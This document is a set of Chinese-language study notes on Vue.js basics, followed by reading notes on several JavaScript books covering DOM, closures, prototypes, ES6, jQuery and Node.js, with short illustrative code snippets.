单次绑定.once:父组件修改不影响子组件      7/7vue-cli是一个脚手架（即已经搭建好的框架，直接在对应文件里增加代码即可补充）。其中父组件是App.vue，里面分为template、script和style分别对应页面版面、数据结构（data）或组件（component）或函数（method）和CSS。其余子组件房子啊/scr/components文件夹下。      ESlint是QA（quality assurance）质量保证工具，用于避免低级错误和统一代码风格。如缩进空2格、函数名和括号之间空一格等。具体标准：https://github.com/standard/standard/blob/master/RULES.md#javascript-standard-style        组件应用模板     &lt;div id=\"app\"&gt;        \t\t\t  \t\t\t  \t\t\t\t  \t\t\t\t  \t\t\t  \t\t&lt;/div&gt;7/111.构造器拓展组件：var MyComponent = Vue.extend({  // 扩展选项})// 所有的 `MyComponent` 实例都将以预定义的扩展选项被创建var myComponentInstance = new MyComponent()The squence to start a vue project is from index.html-&gt;main.js-&gt;App.vue.2.属性与方法Vue实例：代理data属性、$data、$el、$watch3.实例生命周期4.计算属性  method和computed的区别：每次重新渲染method都会再次执行相关函数；computed计算属性依赖缓存。  watched和computed的区别：数据跟随其他数据变动时，watched是使用命令式函数回调，computed是则是构造通用函数，更加简洁。  计算属性有getter和setter5.Class和Style绑定  绑定HTML类：v-bind:class=”{}”  绑定内联样式：v-bind:style=”{}”6.条件渲染  v-if/v-else      复用元素：通过key使得变换placeholder时输入内容会删除      &lt;template v-if=\"loginType === 'username'\"&gt;    &lt;label&gt;Username&lt;/label&gt;    &lt;input placeholder=\"Enter your username\" key=\"username-input\"&gt;  &lt;/template&gt;  &lt;template v-else&gt;    &lt;label&gt;Email&lt;/label&gt;    &lt;input placeholder=\"Enter your email address\" key=\"email-input\"&gt;  &lt;/template&gt;        v-if/v-show：v-if是条件渲染，只在条件为真时才渲染；v-show总是渲染，只是通过CSS进行变换是否显示。7.列表渲染v-for：可选的第二参数作为当前项的索引\t&lt;ul id=\"example-2\"&gt;\t  &lt;li v-for=\"(item, index) in items\"&gt;\t     -  - \t  &lt;/li&gt;\t&lt;/ul&gt;数组更新检测，修改方法：  push()  pop()  shift()  unshift()  splice()  sort()  reverse()新旧数组替换：  filter()  concat()  slice()8.事件处理器:v-on:click      事件修饰符：      &lt;!-- 阻止单击事件冒泡 --&gt;  &lt;a v-on:click.stop=\"doThis\"&gt;&lt;/a&gt;  &lt;!-- 提交事件不再重载页面 --&gt;  &lt;form v-on:submit.prevent=\"onSubmit\"&gt;&lt;/form&gt;  &lt;!-- 修饰符可以串联  --&gt;  &lt;a v-on:click.stop.prevent=\"doThat\"&gt;&lt;/a&gt;  &lt;!-- 只有修饰符 --&gt;  &lt;form v-on:submit.prevent&gt;&lt;/form&gt;  &lt;!-- 添加事件侦听器时使用事件捕获模式 --&gt;  &lt;div v-on:click.capture=\"doThis\"&gt;...&lt;/div&gt;  &lt;!-- 只当事件在该元素本身（比如不是子元素）触发时触发回调 --&gt;  &lt;div v-on:click.self=\"doThat\"&gt;...&lt;/div&gt;            键值修饰符          .enter      .tab      .delete (捕获 “删除” 和 “退格” 键)      .esc      .space      .up      .down      .left      .right      9.表单控件绑定      文本      &lt;input v-model=\"message\" placeholder=\"edit me\"&gt;  &lt;p&gt;Message is: &lt;/p&gt;            多行文本      &lt;span&gt;Multiline message is:&lt;/span&gt;  &lt;p style=\"white-space: pre-line\"&gt;&lt;/p&gt;  &lt;br&gt;  &lt;textarea v-model=\"message\" placeholder=\"add multiple lines\"&gt;&lt;/textarea&gt;            复选框  HTML：\t&lt;input type=\"checkbox\" id=\"jack\" value=\"Jack\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"jack\"&gt;Jack&lt;/label&gt;\t&lt;input type=\"checkbox\" id=\"john\" value=\"John\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"john\"&gt;John&lt;/label&gt;\t&lt;input type=\"checkbox\" id=\"mike\" value=\"Mike\" v-model=\"checkedNames\"&gt;\t&lt;label for=\"mike\"&gt;Mike&lt;/label&gt;\t&lt;br&gt;\t&lt;span&gt;Checked names: &lt;/span&gt;JS：\tnew Vue({\t  el: '...',\t  data: {\t    checkedNames: []\t  }\t})  单选按钮  选择列表  详见：http://cn.vuejs.org/v2/guide/forms.html显示输出:console.log()组件  父组件通过 props 向下传递数据给子组件，子组件通过 events 给父组件发送消息。8/8  axios实现restful api  更新/安装vue库：npm install vue-loader  遇到axios文档中的例子不符合ES6标准，修改代码   const vm = this;

    "content": "学习目录：  Javascript DOM 编程艺术  Mastering Javascript  Design Patterns: Elements of Reusable Object-Oriented Software  锋利的jQuery  Javascript高级程序设计Javascript DOM 编程艺术1. JavaScript简史1.1 JavaScript是一种脚本语言，通常只能通过Web浏览器去完成一些操作而不能像普通意义上的程序那样独立运行1.2 DOM是一套对文档的内容进行抽象和概念化的方法。W3C对DOM的定义：一个与系统平台和变成语言无关的接口，程序和脚本可以通过这个接口动态的访问和修改文档的内容、结构和样式。2.JavaScript语法2.1结构方法1:放在&lt;head&gt;标签中&lt;script&gt;\tJavaScript goes here...&lt;/script&gt;   方法2:放在&lt;body&gt;标签中&lt;script src=\"file.js\"&gt;&lt;/script&gt;2.2变量//JS是弱类型var mood = 33;alert(mood);//关联数组var lennon = Array();lennon[\"name\"] = \"John\";//对象var lennon = Object();lennon.name = \"John\";2.3操作符条件语句：if,else比较操作符：&lt;&gt;=,==,===逻辑操作符：&amp;&amp;,!,||循环语句：while,for3.DOM3.1 定义D:document(文档)O:Object(对象)M:Model(模型)3.2 获取元素:通过元素ID、标签名字、类名字getElementById()getElementsByTagName()getElementsByClassName()3.3获取设置属性.getAttribute().setAttribute()4.JavaScript图片库5.最佳实践5.1平稳退化：当浏览器不支持JavaScript时也能正常浏览。（搜索机器人）7.动态创建标记7.1传统方法document.write(\"&lt;p&gt;This is inserted.&lt;/p&gt;\");innerHTML    //全部内容被替换createElement()    //创建元素appendChild()    //附上子节点createTextNode()    //创建文本insertBefore(newElement,targetElement)    //在已有元素前插入新元素insertAfter()7.2Ajax:对页面的请求以异步方式发送给服务器，依赖服务器端处理（Hijax）XMLHttpRequest    8.充实文档的内容//缩略语：   &lt;abbr title=\"Application Programming Interface\"&gt;API&lt;/abbr&gt;Mastering Javascript [Finished][Indian] Ved Antani本书在我不是很理解的章节一直提及《设计模型》这本书，决定之后尝试研究一下。1. JS入门1.0 JavaScript支持的标准类型7种：Number, String, Boolean, Symbol, Object, Null, Undefined1.1 Number类型的数字，如果大于Number.MAX_VALUE则被赋值为Number.POSITIVE_INFINITY；反之，若小于Number.MIN_VALUE则被赋值为Number.NEGATIVE_INFINITY.1.2 高级数学计算使用Math，如Math.E/Math.SQRT2/Math.abs(-900)/Math.pow(2,3)1.3 parseInt()/parseFloat()将字符串表达式转换成整数或浮点数1.4 JSHint 检查js可疑语法的工具。 很多配置文件结尾使用rc（bashrc/vimrc）：run com，来源于Unix祖先CTSS使用名为runcom文件表示命令行脚本特征，沿用至今缩写为rc。2. 函数、闭包与模块2.1 函数，作为参数传递给另一个函数；作为数据赋值给变量。2.2 IIFE(Immediately Invoked Function Expression) 立即调用的函数表达式 (function() {})();和(function(){}())。缺点：很难调试、无法递归、过多IIFE代码难以阅读。2.3 javascript没有块作用域，只有函数作用域。ES6引入let生成块作用域，let的声明在编译时不会提前到块作用域最顶部。2.4 函数和变量的声明在编译阶段会被移到作用域的顶端（函数表达式不会被提升），函数在先变量在后，而赋值或其他可执行的逻辑依然保留在原位。不要通过条件判断给使用函数声明给函数赋予不同逻辑，因为函数声明不能出现在块结构中，因为所有js实现在这个方面各不相同。块只能包含语句，不能包含函数声明。应该使用函数表达式替代函数声明。2.5 arguments转化成数组：var args = Array.prototype.slice.call(arguments);。2.6 this对象，也称作函数上下文。  作为函数调用的函数，this被绑定在全局对象上。  作为方法调用的函数，this被绑定在方法被调用时所在的对象上。  作为构造函数调用的函数，需在调用前加上关键字new，this被绑定在新创建的对象上。  apply()接受一个参数数组，call()接受参数列表。2.7 闭包是在函数声明时所创建的作用域，使得函数能够访问并处理函数的外部变量。闭包常用来将信息封装成私有变量的形式。2.8 setTimeout()的回调函数在时间到达时才执行，改成立即调用函数表达式解决这个问题。2.9 模块：一个外围函数（IIFE或者具名函数）至少执行一次；外围函数至少返回一个内部函数。3. 数据结构及相关操作3.1 正则表达式3.1.1 正则表达式：字面量var pattern = /test/;和构造RegExp对象的实例var pattern = new RegExp(\"test\");使用pattern.test(\"xxxtest\")实现匹配，返回true/false。使用exec()参数为单个字符串，返回包含了所有匹配的数组。3.1.2 正则表达式中\\b表示单词边界。^/$表示正则表达式的首尾。向后引用可以匹配同一字符串已经匹配好的内容，使用\\1,\\2等数字定义。3.1.3 正常情况下是贪婪模式，会尽可能多的匹配，使用.。在正则表达式后面加上？设置为懒惰模式，会尽可能少的匹配。3.2 数组  xxx.forEach(function() {}); 迭代数组  xxx.concat(xxx); 合并数组  join() \t数组合并成字符串  ES6引入map和setunderscore.js库，提供函数式变成辅助程序4. 面向对象的JS艰深，不太理解4.1 使用普通函数var crazyBob = Player();，不会实例化crazyBob，使用构造函数var swingJay = new Player();会得到一个实例化对象swingJay。4.2 对象的原型，默认属性：prototype。实例属性的优先级高于原型属性。4.3 this的值由函数调用上下文以及调用位置所决定。同2.6  全局上下文中，this在浏览器中一般指代window。  对象方法中，this被赋值或绑定到包含对象上。  不存在上下文，this被绑定到全局上下文。  this用于构造函数，this指向被构造的对象。4.4 将对象实例继承的方法：Child.prototype = new Person();。4.5 JS没有类的概念，只能通过函数作用域实现类似于private/public这种访问修饰器的作用。  特权方法使用this.method = function() {}来声明。可以从外部调用，也可以由成员访问。  公共方法使用Class.prototype.method = function() {}声明。任何人可以读取或写入。  公共属性使用this.prototype来声明。4.6 Object.create()可以在不用调用对象的构造函数的情况下，在父子之间创建使用new操作符一样的原型链。例如：Manager.prototype = Object.create(Employee.prototype);4.7 接收器和设置器 getter/setterUnderscore.js中包含keys()/allKeys()/values()等功能函数5. JavaScript模式5.1 标准化方法创建模块：CommonJS适用于服务器端JS环境(Node.js)。异步模块定义，浏览器优先，支持异步行为。5.2 工厂模式 创建相似对象抽出重复出现的操作；允许工厂的用户在无需了解对象创建内部细节的情况下创建对象。5.3 mixin模式和继承的区别：如需多个对象层次之间共享的功能，使用mixin；如果是单层次，使用继承，且继承的情况下修改原型会影响从原型继承的一切内容。5.4 装饰器模式 xxx.decorate('xxxx');对空白对象进行修饰以满足不同需求。7. ES6语法上的变化7.1 引入四个新的数据结构：Map, WeakMap, Set, WeakSet。对象的缺点是不能使用非字符串值作为键。WeakMap的键必须是对象，值的类型没有限制，不能迭代，无法清除。引入数据类型Symbol，是唯一且不可变的值，通常用作对象属性的标识符，可看做ID。7.2 ...将数组元素分散或集合到函数的各个参数中，如print(a,b)函数，print(...[1,2]);，类似于spread/rest，将参数分散成多个参数/将多个参数集中成一个参数。7.3 for…in遍历索引，for…of遍历数组的值。箭头函数 var f1 = (x,y) =&gt; x*y;，另外箭头函数解决了箭头函数范围内直接使用上一个块this值而不需要单独赋值。8. DOM操作与事件8.1 DOM是HTML的编程接口，允许使用JS等脚本语言对其进行结构化操作。8.2 使用CDN（content delivery network）导入jQuery库。$(document).ready();函数会在DOM文档准备好之后执行。  $( '#username' ).addClass( 'hidden' );添加一个类  $( '#username' ).removeClass( 'hidden' );删除一个雷、类  $( '#username' ).toggleClass( 'hidden' );切换元素的类8.3 增加时间监听器button.addEventListener(\"click\", function(){});。类似的使用$('button').on()可以一次绑定多个事件。9. 服务器端JavaScript9.1 Node采用异步处理的方式，作为一个单线程运行，其本身内部是多线程的。每一个I/O操作都有回调函数。9.2 如下实现一个简单的Node.js服务器（使用request的Node.js模块）。\tvar http = require('http');\tvar server = http.createServer();\tserver.on('request', function (req, res) {\t\tres.writeHead(200, {'Content-Type': 'text/plain'});\t\tres.end('Hello Node\\n');\t});\tserver.listen(3000);9.3 可以通过curl知名查看内部信息。curl -v http://localhost:30009.4 Node包管理器npm(Node Package Manager)。  创建package.json文件：npm init。  将模块的依赖关系自动添加到package.json中：npm install package --save。  全局安装npm install package -g/--global；本地安装npm install package /--save-devDesign Patterns: Elements of Reusable Object-Oriented Software设计模型：可复用面向对象软件的基础Erich Gamma, Richard Helm, Ralph Johnson, John Vlissides本书介绍了什么是设计模式以及如何设计面向对象的软件系统。模型分为3类：创建型、结构型、行为型。本书把面向对象软件的设计经验作为设计模式记录下来，命名、解释、评价这些设计模式，方便人们有效地利用。目前没有需要开发大型软件的需求，暂时不做深入研究，但是这本书还是很有意义的。锋利的jQuery单东林 张晓菲 魏然1. 认识jQuery1.1 JavaScript库：Prototype, Dojo, YUI, Ext JS, MooTools, jQuery。1.2 $(document).ready()表示等待网页中所有DOM结构绘制完毕执行。1.3 jQuery对象是通过jQuery包装DOM对象后产生的对象//jQuery对象转成DOM对象var $cr = $(\"#cr\");\t\t//jQuery对象var cr = $cr[0];\t\t\t//DOM对象var cr = $cr.get(0);\t//DOM对象//DOM对象转成jQuery对象var cr = document.getElementById(\"cr\");\t//DOM对象var $cr = $(cr);\t\t\t\t\t\t//jQuery对象1.4 若jQuery库在其他库之前导入，可以直接使用；jQuery在其他库之后导入，使用var $j = jQuery.noConflict()定义快捷方式来使用。【红宝书】Javascript高级程序设计[America] Nicholas C.Zakas1. 基础1.1 Javascript组成部分：核心(ECMAScript)、文档对象模型(DOM)、浏览器对象模型(BOM)。  ECMAScript由ECMA-262定义，其宿主环境包括：Web浏览器、Node、Adobe Flash等。提供核心语言功能。  文档对象模型(DOM, Document Object Model)：针对XML但经过扩展用于HTML的应用程序编程接口。提供访问和操作网页内容的方法和接口。  浏览器对象模型(BOM, Browser Object Model)：控制浏览器显示的页面以外的地方。提供与浏览器交互的方法与接口。1.2 &lt;script&gt;元素6个属性  async：立即下载脚本且不妨碍页面其他操作，只对外部脚本有效。  charset：通过src属性指定代码的字符集。  defer：脚本延迟到文档完全被解析和显示后再执行，只对外部脚本有效。  language：废弃  src：包含要执行的代码的外部文件。  type：language的替代属性，表示编写代码使用的脚本语言内容类型。一般使用text/javascript在使用&lt;script&gt;嵌入JS代码时，内部不能出现&lt;/script&gt;字符，否则浏览器会以为是结束标签。使用外部文件时，带有src属性的&lt;script&gt;元素内不能有额外的JS代码。外部文件位置一般放在body开头，放在head里会使得外部文件在页面渲染前运行，在放在body中则是页面渲染之后再运行外部文件。当然，可以通过增加defer属性实现脚本运行延迟。若使用async属性，则多个外部脚本的运行顺序不能确定。在XHTML中，可以使用CDATA[]片段来包裹js代码，实现可以使用特殊符号，如&lt;等。1.3 文档模式：混杂模式、标准模式"
